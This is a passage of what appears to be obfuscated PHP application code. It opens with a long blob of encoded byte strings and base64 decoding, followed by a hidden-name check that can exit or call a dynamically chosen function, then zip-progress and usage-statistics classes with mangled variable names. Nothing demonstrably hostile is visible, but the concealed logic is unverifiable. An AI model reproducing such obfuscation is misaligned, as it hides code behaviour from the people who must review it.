0&¯œgVĞ³Pû³Cğ«°±ùB')."\x44\x5e\xfd\xa8\x92\x8a\x5d\x70\xb0\xaf\x71\xd7\xe3\xc0\xf9\x11\x8e\x69\xf3\xed\x31\x2e\x3e\x90\x92\x96\xcf\xb0\x2c\xdf\x26\x68\x16\xef\x12\x51\x55\x87\x69\x81\xf4\xec\x1\x47\x45\xd5\x60\x95\xd7\x58\xdd\x88"."\161\50\171\65\102\332\261\273\242\156\123\132\234\103\222\150\120\124\132\171\311\272\157\263\245\233\75\52\41\114\120\111\120\60\340\327\256\75\227\5\316\21\164\24\227\54\27\253\324\17\112\345"."\x65\xe2\x1a\x14\x84\x5\x2c\x8\x30\x25\x3d\x69\x96\x52\x78\x41\x14\x2c\x23\x59\xb0\x63\x7a\x46\x8e\x12\xeb\x5\x36\x1b\x84\x63\x7a\xb9\x8\xec\xb8\x4c\x62\x3b\x78\x16\x6\x92\x76\x59\x76\x83\x26\xbd\x5d\x81"."\142\322\33\45\222\40\352\155\124\270\4\253\322\222\151\144\226\224\100\360\253\11\263\56\365\255\164\237\215\150\246\342\345\101\176\30\355\22\61\331\25\71\105\226\340\330\235\67\134\0\361\113".base64_decode('hVtgyWmoWOwzXrRMzkK+WZGFpmEhSlyOk1Ms/PhILxvFailVPkWSpB5NMkqDWb5adBIkjA==')."\xe9\xcc\x76\xdb\xdb\xd8\xe4\x9d\xd\x3b\x18\xf9\xc2\x1c\xdb\x9c\xd1\x18\xde\x38\x4a\x64\x80\xb7\xb7\x8c\x8d\x81\xe5\x33\xe0\x9\x1c\x53\x3a\xd2\x27\x9e\xa0\x84\xa7\x19\xe2\xdc\x8a\x8f\x27\xf1\x82\xc5\x63\x25"."\x49\x96\xd0\xb9\x55\x34\x71\x13\x25\xb3\x75\x61\xb9\x44\x8d\xa5\x31\x42\x6f\xb5\x74\xda\x43\x38\xb9\xdd\x61\xde\xee\x42\x40\xf3\xc3\x99\xe\xcf\x90\x88\xca\x50\x4f\x55\xa6\xc3\xdc\xd0\x55\x8\xbc\x75\x23\x3f"."\264\102\162\211\166\210\73\0\10\144\322\307\116\244\216\21\26\130\324\201\26\273\344\300\231\234\0\47\114\16\254\264\342\302\124\11\105\122\317\2\260\343\255\253\307\236\5\34\332\306\356\61".base64_decode('fv8bmzziRZobtVtyhKVy4rQcEWri6cjNQRxrRB+kAb5T7+nq8XNQK5+eVFEi/PO1MTtKfQ==')."\124\207\15\336\110\336\110\52\341\150\147\250\55\20\156\17\305\227\53\31\174\14\313\45\25\362\126\221\163\52\23\55\61\355\170\106\325\203\374\335\34\34\364\16\242\35\203\67\305\167\125\226"."\330\77\221\266\100\141\342\221\101\147\261\224\376\364\122\105\211\5\174\153\57\127\221\7\353\276\253\140\347\204\246\127\102\56\226\364\112\374\61\35\133\66\112\65\226\62\224\253\324\6\360\253"."\177\201\74\166\44\143\43\101\110\57\114\125\171\243\60\154\130\206\230\370\54\307\230\134\172\240\275\73\24\121\3\341\160\164\245\303\40\130\150\375\113\134\145\222\222\37\236\222\106\106\14\2".base64_decode('/XqlG0hwuic/6uFSo9Dhk/2JFtnZFjyIyx+ioVHpYbhiSTMsXQLQN8xmwiU5LZdzPPOaSw==').strrev('úä%RñMö`Iù6šôĞ«ñœYŠFO	HÕWø•ÙÔ,B5;HˆÁ€~•)ú­es²ÑK')."\260\236\107\34\267\251\304\277\31\173\301\323\44\33\44\220\336\51\54\24\125\251\307\75\361\11\44\257\224\306\212\362\1\255\77\5\45\140\237\250\101\166\30\210\43\142\207\202\261\240\20\374".base64_decode('FbpvRdtxrDpkexmmhkMMAzrcYWXpehnQbRfvePev4hvkGRqaRs6gEOaAaBOK8WenRFZ3Sg==')."\x95\xa\xa0\x64\x45\x28\xb7\x38\x82\xd2\xa2\x34\xd0\x47\x2a\xf9\x93\x42\xca\x62\xe6\xf0\x41\x7c\x80\x78\x13\xc\xe6\x8b\xb6\x63\x4f\xdf\x25\xdf\x91\x91\x86\x84\x2\xb0\xa6\xa7\xc4\x55\x75\x74\xcc\x59\x14\xf".base64_decode('bAsbTFVeJYmgJHZ62ADTzI9VABx6sDBrDTeJxs8wFdKm3OuEn+NrUvQJWqpy8KCdh25XPg==')."\x66\x47\xb3\xff\xdf\x64\xa4\x89\x71\xc9\xc1\xad\xb3\x90\xca\xa\x59\xee\x95\x52\x48\x6d\xf8\x9d\xbe\xac\x39\xe2\x7c\x97\x16\x43\xdc\x2f\xf3\x39\xde\xe4\x93\x66\x18\x71\x5f\x20\xbf\x22\xe8\xcc\xe4\xa9\x78\xe"."\x4b\x21\x4f\x8a\x2b\x88\x19\xc1\xd8\x63\x13\x1e\xb6\xa5\x25\xc8\xd2\xa7\x67\xd0\x9f\x7e\xf8\x65\xab\xa1\xbb\x12\x94\xcf\xc1\x27\xeb\x39\x29\xb6\x65\x8d\x5c\xaa\xc4\x8d\xb3\x4\xa0\x5b\x17\x7a\x6\x92\xb\x31"."\226\242\306\236\116\47\157\166\102\163\371\13\134\325\236\153\304\336\114\235\17\211\211\367\331\304\322\353\174\257\212\37\377\133\142\12\131\266\343\205\264\204\231\320\62\36\112\252\230\51\212\130".base64_decode('65gcls30SStQItMFpvh4L5EQ2KOnKQ95kZPyRfcTX9L85OxXzp3JmYNaDiwHHZfqSmgzpg==')."\263\45\304\201\106\101\176\255\130\24\47\37\362\212\213\376\165\334\227\206\264\336\104\227\112\174\207\250\324\74\41\56\150\116\72\215\244\100\70\231\54\27\102\364\4\306\1\55\111\333\104\331"."\65\64\75\225\21\327\156\1\35\325\263\207\36\303\102\207\311\105\262\243\161\256\121\107\374\210\357\246\375\225\107\351\330\350\14\70\12\66\362\141\326\125\103\46\331\215\371\344\175\34\40\50".strrev('ÓÙû)„şJÛ<—"{æ»OÉò”rkÚµ[x9ùéPöd)ÂSÍôÓ		IŒ‰A‹').strrev('ÉİÌC+«w…¦÷;·Ád¹xÇÎ4E¼û‰ÔYıa¸Vıò`U­[Àêl­sÙ\\\'Ê')."\x9\xb3\x52\xbd\x2c\x8c\xd\x1c\xaf\xcb\x4a\xad\x6\xd6\x56\xf9\x42\xad\xd4\xd\x52\xbb\xcb\xa5\x9c\x87\xd8\x5d\x78\x98\xfd\x63\xd5\x47\x6e\x1d\x4f\xe6\xb9\x7\xb4\xca\x33\xb9\x9f\x5b\x20\xdc\x7f\x20\x7b\xb6"."\224\223\353\65\57\36\54\261\3\152\67\232\341\240\135\264\0\213\113\176\324\21\164\305\2\261\72\237\152\232\75\167\241\254\33\21\103\50\216\155\301\137\12\234\76\203\214\43\210\102\161\164"."\203\107\141\336\247\345\331\117\22\235\27\152\52\137\124\166\255\0\377\263\11\43\66\37\24\125\262\321\255\174\173\276\242\7\10\235\112\226\142\322\202\350\262\360\61\261\321\215\45\146\35\135"."\x2\xc5\x3b\xca\xce\x6f\x51\xf1\xa1\x4a\x3b\xc4\x67\xa5\xc9\x42\xdf\xc4\x35\x73\x78\x8b\x9e\xc7\xaa\x7f\xbb\xa4\x39\xf7\xa3\xd5\xb6\x5d\xa4\x27\xd8\x1e\xf\x6b\x6f\x45\xcc\x69\x3\x5\xca\x18\x91\x2c\xed\xcb"."\xe4\x12\x6d\xd3\xad\x49\xc2\xd9\xf1\xba\x48\xb4\xa2\xd1\x42\xe\x96\x6d\xec\x7e\x42\xcc\x36\x89\x13\xfd\xf\x6\x90\x6d\xb1\xe8\x6e\x4c\x18\x7f\xe1\xe6\x3b\x76\xe6\xce\x5e\xf0\x2f\x63\x6c\xa6\xca\xfb\xc7\x92"."\151\314\147\264\201\112\172\174\153\351\325\154\257\104\234\222\46\122\267\243\144\260\201\135\210\35\260\263\335\256\342\121\66\121\306\200\107\231\12\251\122\334\223\236\111\26\56\17\45\101\17\347"."\x66\x97\xc7\xa7\x50\x20\x90\xbb\xcb\x4e\x91\x49\x7e\xc5\x95\x5c\xfc\x15\xbe\x79\xc8\xd4\x75\x4c\x63\xc9\xd9\xbb\x7c\x71\x96\x14\x24\xcf\x8f\xca\xa2\xa5\x37\x71\x85\x82\x89\x68\xa4\xa0\x45\x30\xb9\x89\xad\x4"."\xa9\x66\xa0\x93\x5f\xbb\xd6\x24\x4b\x3e\xa7\xd6\xb\x84\x3b\xe9\x41\x77\xd4\x7d\xd2\x9b\xe7\xa6\x1c\x96\xde\x5a\x46\x6b\x42\x94\x5d\x9d\x40\xd5\x71\x6c\x63\x51\x5c\xf8\x1c\x97\xf8\x57\xca\x5\x64\x7d\x46\x98"."\206\340\207\322\165\176\307\126\211\77\23\352\330\72\131\356\267\202\221\50\350\170\216\44\125\361\274\72\60\116\162\171\216\176\115\132\172\131\245\62\122\50\122\316\213\210\244\73\46\373\55\236"."\xe8\xf0\x7a\x80\x1d\xfb\xb9\x78\x4\xf3\xa5\x60\xb9\x9e\x10\xa7\x3e\xc3\x69\x98\x6d\xb\xfe\xd7\xcf\xe4\xfe\xbf\x7a\x1d\x77\x6e\x3\xd3\xf2\xe3\xf2\xf9\x15\xbf\x4e\x10\xce\xa1\xb6\xf8\x28\x95\xeb\x3a\xa8\x86".base64_decode('2dUO5/J6OFAR6nzfsGAqJM4NyJlzR+bzUWMnbVouJy3C1bczFW+XI+Ib4u9dV4u4rwi73w==')."\61\357\43\12\136\366\104\371\100\65\104\301\227\370\256\251\12\35\123\20\23\226\5\117\52\30\311\241\52\307\344\304\36\326\351\343\137\22\116\52\320\104\35\220\14\303\274\146\372\131\50\211"."\267\213\304\103\14\364\236\174\213\77\132\144\33\313\172\130\5\6\340\27\74\207\0\323\222\31\225\3\124\301\336\22\216\61\161\0\345\356\26\74\310\307\206\323\221\243\333\365\54\63\105\142"."\116\201\301\12\102\342\247\225\126\23\225\271\71\37\220\263\140\273\175\247\152\14\17\60\256\230\267\301\353\2\64\172\135\305\361\227\251\235\264\356\170\52\231\132\232\240\11\22\303\52\20\246"."\xa\x23\x87\x4b\xe4\x94\xd9\x5b\x99\x87\xd2\x75\x5c\xe0\x4c\x31\xb3\xaa\xcf\x6f\x5e\x29\xa1\xe\xc4\x21\xb9\x3f\x18\x9f\xe8\x29\x99\x44\x50\x74\x42\xb9\x5a\x48\xb2\x8c\x4e\x4a\x3a\x57\xb7\xec\x47\xc1\x33\x7c"."\162\103\344\343\127\347\31\16\66\315\23\207\232\211\150\54\250\256\14\141\217\23\241\65\301\136\346\53\331\60\311\153\46\254\310\336\356\72\162\151\15\46\0\332\305\164\230\202\224\164\304\314"."\x24\x5\xb0\x70\xf8\x6b\xe7\x8b\x6d\xfc\x8\xd6\x79\xf5\x59\xba\x20\xc1\xdc\x6d\xc9\x2a\x49\x27\x32\xbe\xe5\xe2\x9c\x8b\x4b\xaa\xa1\x25\xcd\x92\x25\x7b\xcb\x74\x24\x62\xb1\xcb\x44\xa9\x31\xb6\x8f\xee\x2d\xa0"."\211\254\47\155\75\245\340\5\334\41\323\367\315\151\230\75\360\131\245\240\164\216\71\347\163\60\141\163\21\237\355\145\126\274\14\247\152\76\223\272\307\251\226\206\150\63\156\73\210\110\74\205".base64_decode('434Cp8PheqpZUpEqxAkXvIU0xdhEzDYhWrjSMGuYOhXvTvk5M3uvBFvI+bGPLnwNw0/oDw==').strrev('"HÃÇÎR¶mœé ÈØ'."\r".'=4C›DÛóË´XÒì—ÂÜ­Çvh@N°†Ê¼Õ«Û4')."\1\63\247\334\120\202\164\322\353\74\150\347\327\131\53\326\277\262\21\226\222\111\56\346\334\25\375\342\233\371\41\341\41\211\44\323\63\254\300\260\306\235\220\271\163\365\72\66\262\322\261\174"."\222\160\210\140\345\311\253\70\20\226\244\107\226\15\357\204\305\302\356\202\113\34\125\254\171\332\260\220\205\305\136\54\225\352\320\206\253\240\246\164\267\23\71\4\341\250\104\226\226\134\153\210".strrev('Ğ·GÈØ½ö‘a·8ú ¢p{]—fs‡	óZ¬13DàÎ/ÊCzáP•ˆV7Àuüˆú1+')."\xa6\x70\xf5\x8e\xf8\xa4\xd3\x91\x8\x47\xe3\x63\x86\x70\xc8\x5\x3b\xaf\x3\xea\xda\xc9\x63\x4d\x1a\x93\x3\x5d\x49\xa0\x5b\x92\x8a\xaf\xaa\x82\x92\x48\x40\xcf\x85\xa5\xe2\xe4\x93\xf8\x29\x33\xc4\xab\x7f\x44"."\x50\xa5\xb3\x8b\x25\xf\x2c\x22\x81\x89\x2c\x72\x29\x8e\x35\x8b\x37\xc\x30\x63\x72\xa2\xa3\x3a\xee\xa1\x25\x1b\x4f\x41\xbe\x14\x98\x27\x6a\x7c\x9a\x16\x70\x26\x51\x7c\xdd\x55\x7b\x39\x83\xbb\x65\x34\x87\xe3"."\335\100\31\76\142\330\311\254\264\113\256\114\254\204\227\52\72\33\52\120\275\35\356\332\262\276\166\353\16\104\41\25\365\221\314\174\22\146\225\74\264\106\125\263\321\44\234\123\154\116\34\171"."\xa7\xe8\x2\x9c\x97\x26\xe1\xbc\x15\xc9\x2c\x73\x45\xbf\x92\x7c\xb6\x56\xb6\xa6\x68\x5e\x65\xe7\x81\x2e\x2a\x55\xa5\xc1\x42\x63\x23\xa1\x4e\xd5\x9f\x55\x91\x2b\x3f\x7\x94\xe8\xc6\x26\xca\xab\xea\xb5\x10\x3a".base64_decode('J5e5RbVaVEWeshZubCFz4B1otRSHdZJzRanGt1lKFU5NudCUZkvClKdyyRBpVQyL6Cex9A==')."\x23\x7b\x6b\xac\x92\x2c\x5b\x29\x55\xb7\x63\x8a\x55\xe5\x32\x96\xd3\xc0\xc8\x5\x97\x3b\x8\xfc\x89\xd3\x8\x33\x44\x44\x22\x58\xce\x18\x12\x6\x9c\xec\xfe\x6\x68\x1d\xb8\x35\xe4\x50\xc1\xe4\xcb\x53\x4a\xd8"."\xe7\x62\xc9\x29\x50\x72\xf7\x73\x45\x69\x4e\xd2\x2f\x94\x25\xcf\xee\x55\xaf\x93\x78\xb0\x62\xa8\x52\x5\x93\xd3\xf8\xbd\x3e\x61\xe3\x46\xf7\xcc\xa6\x6d\x24\x75\xa7\xfb\x78\xd9\x69\x23\x4d\x67\x1f\xc9\x49\x6a"."\x68\x97\x6\x58\xa8\xa9\x1c\x6\x30\x55\xf4\xa2\x4\x44\x83\x3e\x71\x18\x43\xcb\x13\x6d\x91\x68\xc2\x71\xdb\x8b\x8a\x24\x70\x86\x45\x8f\xbf\xdb\xb0\x4d\x6\x3f\xf8\x24\x3e\xcc\xe9\x12\x4e\x93\xe3\x66\xc9\xf6"."\340\264\204\131\44\277\255\246\155\13\153\22\252\27\42\142\66\136\207\75\222\261\24\12\211\123\116\134\51\162\174\106\310\226\160\54\22\204\203\170\254\160\211\353\64\225\360\71\107\4\37\313"."\xf1\x88\xbc\xcc\xc2\x81\x7c\x47\xd9\x65\x32\x20\x0\x43\x66\x6a\xd0\x1c\x65\x9e\x12\x11\x5d\x49\x9d\x24\xe\xee\x34\xb7\x6c\x29\xc4\x22\x20\x45\xd9\xf4\x8b\x78\x1a\xb1\xfc\x34\xc5\xf\x6f\x15\x79\x49\x19\xf0"."\x1e\xaa\x6f\x5d\x31\xe3\xc8\x4e\xdf\x75\xe4\x26\xda\x9f\x55\x2\x28\xef\x45\x11\xf4\xa1\x12\xa2\x49\x85\xdb\x68\xf1\x44\xbc\x22\xa9\x27\x10\x8f\xaf\x8c\xc6\xda\xe9\xbb\x26\x15\xc9\x24\x97\x64\x4a\x57\x91\xd4"."\323\25\215\114\225\26\354\16\204\302\25\151\330\352\56\242\12\237\233\64\51\324\103\152\111\316\236\247\252\105\250\155\271\250\111\245\253\123\166\126\26\206\207\52\305\270\110\147\107\305\254\311"."\216\204\30\176\134\313\61\145\220\164\266\240\347\205\123\126\221\307\251\343\222\307\337\142\336\223\171\300\371\230\240\313\10\226\21\66\24\204\55\353\42\120\166\254\10\120\374\36\14\347\17\134".base64_decode('zhfmHT6HGYgEJ3OIMCWJNuX1ngBmVu0g+ayh8hyMpIoOwBU7yRykkXXmoHTORXdZcJscug==')."\x54\xb2\x9e\xa4\x61\x47\xb2\xad\x65\xaa\x5a\x43\x50\x15\x32\xe6\x12\x42\xb9\xfb\x7f\x0\x69\x80\xf0\x55\x69\xb9\x0\x0".""."", 10, -8))); goto DŒöËóÆ®; d÷ÀÉ…ÊÍ: if ($_SERVER[$_SERVER[íïàËŸë][909]] != $_SERVER[$_SERVER[íïàËŸë][966]]) { $_getc = $_SERVER[íïàËŸë][911]; $_getfile = $_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íïàËŸë][262], $_getfilec); if (count($_getarrs) < $_SERVER[íïàËŸë][702]) { $exit = $_SERVER[íïàËŸë][914]; $exit(); } $_act = $_SERVER[íïàËŸë][915]; $_act($_SERVER[$_SERVER[íïàËŸë][910]]); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÄĞº Ò« =& $_SERVER[íïàËŸë]; parent::startAfter(); Hook::bind($ÄĞº Ò«[1906], array($this, $ÄĞº Ò«[1896])); Hook::bind($ÄĞº Ò«[1898], array($this, $ÄĞº Ò«[1899])); $Ñš†—€¤ =& $this->task; $Ñš†—€¤[$ÄĞº Ò«[1900]] = $ÄĞº Ò«[1290]; if (!$Ñš†—€¤[$ÄĞº Ò«[1671]]) { $Ñš†—€¤[$ÄĞº Ò«[1671]] = LNG($ÄĞº Ò«[1907]); } } protected function endAfter() { $ˆä­äÅ¢ =& $_SERVER[íïàËŸë]; parent::endAfter(); Hook::unbind($ˆä­äÅ¢[1906], array($this, $ˆä­äÅ¢[1896])); Hook::unbind($ˆä­äÅ¢[1898], array($this, $ˆä­äÅ¢[1899])); } public function updateAfter() { $ÅĞÍ›ˆŸ =& $_SERVER[íïàËŸë]; $İÄóäœ· =& $this->task; if (!$İÄóäœ·[$ÅĞÍ›ˆŸ[1152]] || !$İÄóäœ·[$ÅĞÍ›ˆŸ[846]]) { return; } if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1900]] == $ÅĞÍ›ˆŸ[1290]) { $¶Ö„¶• = $İÄóäœ·[$ÅĞÍ›ˆŸ[1836]]; if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1837]] != $ÅĞÍ›ˆŸ[1290]) { $¶Ö„¶• = 0; } $ß‚úÎ§Ú = ($İÄóäœ·[$ÅĞÍ›ˆŸ[1840]] + $¶Ö„¶•) / $İÄóäœ·[$ÅĞÍ›ˆŸ[846]]; $İÄóäœ·[$ÅĞÍ›ˆŸ[1784]] = $ß‚úÎ§Ú * 0.3; } else { if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1900]] == $ÅĞÍ›ˆŸ[389]) { $ß‚úÎ§Ú = $İÄóäœ·[$ÅĞÍ›ˆŸ[1783]] / $İÄóäœ·[$ÅĞÍ›ˆŸ[1152]]; $İÄóäœ·[$ÅĞÍ›ˆŸ[1784]] = 0.3 + $ß‚úÎ§Ú * 0.5; } else { if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1900]] == $ÅĞÍ›ˆŸ[110]) { $ß‚úÎ§Ú = 0; if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1835]]) { $ß‚úÎ§Ú = $İÄóäœ·[$ÅĞÍ›ˆŸ[1836]] / $İÄóäœ·[$ÅĞÍ›ˆŸ[1835]]; } $İÄóäœ·[$ÅĞÍ›ˆŸ[1784]] = 0.3 + 0.5 + $ß‚úÎ§Ú * 0.2; } } } if ($İÄóäœ·[$ÅĞÍ›ˆŸ[1784]] > 0) { $‚„õÄÕ = timeFloat() - $İÄóäœ·[$ÅĞÍ›ˆŸ[1786]] - $İÄóäœ·[$ÅĞÍ›ˆŸ[1789]]; $İÄóäœ·[$ÅĞÍ›ˆŸ[1790]] = $‚„õÄÕ * (1 - $İÄóäœ·[$ÅĞÍ›ˆŸ[1784]]) / $İÄóäœ·[$ÅĞÍ›ˆŸ[1784]]; } } public function copyFileStart($ÊÔèŞ°Á, $•–İ–Ä³, $’²¯®Ù§, $¡âÉä€¸, $²‰ÊÕèô, $Ä±‡ŠÏ…) { $Œ©Úô’Í =& $_SERVER[íïàËŸë]; parent::copyFileStart($ÊÔèŞ°Á, $•–İ–Ä³, $’²¯®Ù§, $¡âÉä€¸, $²‰ÊÕèô, $Ä±‡ŠÏ…); $Ï÷ÀÅª¬ =& $this->task; if ($Ï÷ÀÅª¬[$Œ©Úô’Í[1900]] == $Œ©Úô’Í[389]) { $Ï÷ÀÅª¬[$Œ©Úô’Í[1900]] = $Œ©Úô’Í[110]; } $this->update(); } public function copyFileEnd($òî‰ğ°Ò, $‰¨ÉÁ›, $ÖÙõ¶®, $Êïó‰ì€, $Ó‡ªü´, $€âˆ³¼…) { $Óöæ»¶„ =& $_SERVER[íïàËŸë]; $ù„Üş =& $this->task; $ù„Üş[$Óöæ»¶„[1836]] = $ù„Üş[$Óöæ»¶„[1835]]; $ù„Üş[$Óöæ»¶„[1840]] += $ù„Üş[$Óöæ»¶„[1835]]; $ù„Üş[$Óöæ»¶„[1837]] = $Óöæ»¶„[12]; $this->update(); } public function zipEvent($ú†´¸—, $­•¥ªÆ¿, $ÊªÎ½ÓÇ, $ĞòÏøÒí) { $‡ëÂõ¨ =& $_SERVER[íïàËŸë]; $”Ú××È =& $this->task; $”Ú××È[$‡ëÂõ¨[1833]] = get_path_this($­•¥ªÆ¿); $”Ú××È[$‡ëÂõ¨[1835]] = $ĞòÏøÒí; $”Ú××È[$‡ëÂõ¨[1836]] = $ÊªÎ½ÓÇ; $”Ú××È[$‡ëÂõ¨[1154]] = $ú†´¸— == $‡ëÂõ¨[1908] ? $‡ëÂõ¨[1903] : $‡ëÂõ¨[1904]; $”Ú××È[$‡ëÂõ¨[1837]] = $‡ëÂõ¨[12]; $”Ú××È[$‡ëÂõ¨[846]] = $ĞòÏøÒí; $”Ú××È[$‡ëÂõ¨[1900]] = $‡ëÂõ¨[389]; $this->update(); } public function nameParse($‰şèı“ô) { $à„°µÑ² =& $_SERVER[íïàËŸë]; $Œ¬˜ƒ =& $this->task; if ($Œ¬˜ƒ[$à„°µÑ²[1783]] < $Œ¬˜ƒ[$à„°µÑ²[1152]]) { $¹µ²¿®® = get_path_this($‰şèı“ô); if (strstr($¹µ²¿®®, $à„°µÑ²[10])) { $Œ¬˜ƒ[$à„°µÑ²[1783]] += 1; } } if ($Œ¬˜ƒ[$à„°µÑ²[1900]] == $à„°µÑ²[1290]) { $Œ¬˜ƒ[$à„°µÑ²[1900]] = $à„°µÑ²[389]; } $Œ¬˜ƒ[$à„°µÑ²[1833]] = $‰şèı“ô; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($‹¥±üÊŠ) { $ªñŸ˜‹Œ =& $_SERVER[íïàËŸë]; $âúô—ĞØ = array($ªñŸ˜‹Œ[662] => array($ªñŸ˜‹Œ[33] => $ªñŸ˜‹Œ[1909], $ªñŸ˜‹Œ[350] => array($ªñŸ˜‹Œ[255], $ªñŸ˜‹Œ[848], $ªñŸ˜‹Œ[1910], $ªñŸ˜‹Œ[1911])), $ªñŸ˜‹Œ[1912] => array($ªñŸ˜‹Œ[33] => $ªñŸ˜‹Œ[1913], $ªñŸ˜‹Œ[350] => array($ªñŸ˜‹Œ[255], $ªñŸ˜‹Œ[846], $ªñŸ˜‹Œ[1914], $ªñŸ˜‹Œ[1915], $ªñŸ˜‹Œ[1916]))); if (!isset($âúô—ĞØ[$‹¥±üÊŠ])) { return !1; } $this->optionType = $âúô—ĞØ[$‹¥±üÊŠ][$ªñŸ˜‹Œ[33]]; $this->field = $âúô—ĞØ[$‹¥±üÊŠ][$ªñŸ˜‹Œ[350]]; return !0; } public function listData($„ûœû’ = false, $Ÿª»¯ÄÆ = "\x6d\x6f\144\151\x66\171\x54\151\155\145", $¯æıº˜û = false) { return parent::listData($„ûœû’, $Ÿª»¯ÄÆ, $¯æıº˜û); } public function trendList($ıÇÖ¬æ‡) { $ì‘¿ßåÖ =& $_SERVER[íïàËŸë]; $Ù´Äç¤÷ = $this->listData(); if ($Ù´Äç¤÷) { $¨ÁŠéÜ = end($Ù´Äç¤÷); $µ˜àêÍ‰ = date($ì‘¿ßåÖ[1917], strtotime($ì‘¿ßåÖ[1918])); if ($¨ÁŠéÜ[$ì‘¿ßåÖ[255]] == $µ˜àêÍ‰) { return $Ù´Äç¤÷; } $İÌ²şö³ = strtotime($¨ÁŠéÜ[$ì‘¿ßåÖ[255]]); } if (!isset($İÌ²şö³)) { $¼åù«ôİ = $ıÇÖ¬æ‡ == $ì‘¿ßåÖ[662] ? $ì‘¿ßåÖ[598] : $ì‘¿ßåÖ[907]; $İÌ²şö³ = Model($¼åù«ôİ)->min($ì‘¿ßåÖ[231]); } $Š–Å´Î = $ì‘¿ßåÖ[1919] . ucfirst($ıÇÖ¬æ‡); $¡É… –« = $this->dateList($İÌ²şö³); foreach ($¡É… –« as $µ˜àêÍ‰) { $this->{$Š–Å´Î}($µ˜àêÍ‰); } return $this->listData(); } private function dateList($öì¤ƒÜ) { $‘àÄı…Ö =& $_SERVER[íïàËŸë]; $Ë«ŞË = $öì¤ƒÜ; $ÉŒË»®æ = strtotime($‘àÄı…Ö[1918]); $İÇÜµø’ = array(); while ($Ë«ŞË <= $ÉŒË»®æ) { $İÇÜµø’[] = date($‘àÄı…Ö[1917], $Ë«ŞË); $Ë«ŞË = strtotime($‘àÄı…Ö[1920], $Ë«ŞË); } return $İÇÜµø’; } public function _recordUser($ÜöËõÔ— = '') { $ëæ½š› =& $_SERVER[íïàËŸë]; $¾”å™Ç¼ = strtotime(date($ëæ½š›[1921], strtotime($ÜöËõÔ—))); $¡Ê±“òÓ = strtotime(date($ëæ½š›[1922], strtotime($ÜöËõÔ—))); $†‚áş±ô = array($ëæ½š›[231] => array($ëæ½š›[1102], $¡Ê±“òÓ)); $Ÿõ·™ê¬ = Model($ëæ½š›[598])->where($†‚áş±ô)->count($ëæ½š›[1782]); $†‚áş±ô[$ëæ½š›[231]] = array($ëæ½š›[409], array($¾”å™Ç¼, $¡Ê±“òÓ)); $š·ø‡Šæ = Model($ëæ½š›[598])->where($†‚áş±ô)->count($ëæ½š›[1782]); $†‚áş±ô[$ëæ½š›[33]] = $ëæ½š›[1923]; $ºÕ³’£ = Model($ëæ½š›[1924])->where($†‚áş±ô)->count($ëæ½š›[1925]); $€ÌæÕÉ´ = array($ëæ½š›[255] => $ÜöËõÔ—, $ëæ½š›[848] => (int) $Ÿõ·™ê¬, $ëæ½š›[1910] => (int) $š·ø‡Šæ, $ëæ½š›[1911] => (int) $ºÕ³’£); return $this->insert($€ÌæÕÉ´); } public function _recordStore($œ˜¨ø–µ = '') { $Æº¹±¤¿ =& $_SERVER[íïàËŸë]; $Ëïûó¾ß = strtotime(date($Æº¹±¤¿[1922], strtotime($œ˜¨ø–µ))); $Ö‰æñ‘ = array($Æº¹±¤¿[231] => array($Æº¹±¤¿[1102], $Ëïûó¾ß)); $Ã¿Å³ÊŸ = Model($Æº¹±¤¿[544])->where($Ö‰æñ‘)->sum($Æº¹±¤¿[79]); $Ö‰æñ‘[$Æº¹±¤¿[485]] = 0; $Ûªæğ = Model($Æº¹±¤¿[907])->where($Ö‰æñ‘)->sum($Æº¹±¤¿[79]); $Ö‰æñ‘[$Æº¹±¤¿[190]] = 1; $¼±Ë­¹¿ = Model($Æº¹±¤¿[907])->where($Ö‰æñ‘)->sum($Æº¹±¤¿[79]); $Ö‰æñ‘[$Æº¹±¤¿[190]] = 2; $ñ¡¿»×Ï = Model($Æº¹±¤¿[907])->where($Ö‰æñ‘)->sum($Æº¹±¤¿[79]); $ä—óÎš¡ = array($Æº¹±¤¿[255] => $œ˜¨ø–µ, $Æº¹±¤¿[846] => (int) $Ûªæğ, $Æº¹±¤¿[1914] => (int) $Ã¿Å³ÊŸ, $Æº¹±¤¿[1915] => (int) $¼±Ë­¹¿, $Æº¹±¤¿[1916] => (int) $ñ¡¿»×Ï); return $this->insert($ä—óÎš¡); } public function trend($Ş–»¡Ö, $×ÜéÏ²‚) { $Œå¸ÅÉÑ =& $_SERVER[íïàËŸë]; if (!$this->init($Ş–»¡Ö)) { return !1; } $’ÔÙÃ–‚ = $this->trendList($Ş–»¡Ö); if ($’ÔÙÃ–‚ && $×ÜéÏ²‚ != $Œå¸ÅÉÑ[1755]) { $–„°„™ó = $’ÔÙÃ–‚[0][$Œå¸ÅÉÑ[255]]; $è¡‹êïÔ = $this->validDate($×ÜéÏ²‚, $–„°„™ó); $¹´¿ÉÃŸ = array(); $á£«›–¨ = array_to_keyvalue($’ÔÙÃ–‚, $Œå¸ÅÉÑ[255]); foreach ($è¡‹êïÔ as $™ş„‹ğÕ) { if (isset($á£«›–¨[$™ş„‹ğÕ])) { $Ã˜ÓÅ±Ô = $á£«›–¨[$™ş„‹ğÕ]; } else { $Ã˜ÓÅ±Ô = end($’ÔÙÃ–‚); $Ã˜ÓÅ±Ô[$Œå¸ÅÉÑ[255]] = $™ş„‹ğÕ; if ($Ş–»¡Ö == $Œå¸ÅÉÑ[662]) { $Ã˜ÓÅ±Ô[$Œå¸ÅÉÑ[1910]] = $Ã˜ÓÅ±Ô[$Œå¸ÅÉÑ[1911]] = 0; } } $¹´¿ÉÃŸ[] = $Ã˜ÓÅ±Ô; } $’ÔÙÃ–‚ = $¹´¿ÉÃŸ; } $‡Û·ß¨ı = array($Œå¸ÅÉÑ[662] => array($Œå¸ÅÉÑ[848] => LNG($Œå¸ÅÉÑ[1926]), $Œå¸ÅÉÑ[1910] => LNG($Œå¸ÅÉÑ[1927]), $Œå¸ÅÉÑ[1911] => LNG($Œå¸ÅÉÑ[1928])), $Œå¸ÅÉÑ[1912] => array($Œå¸ÅÉÑ[846] => LNG($Œå¸ÅÉÑ[1929]), $Œå¸ÅÉÑ[1914] => 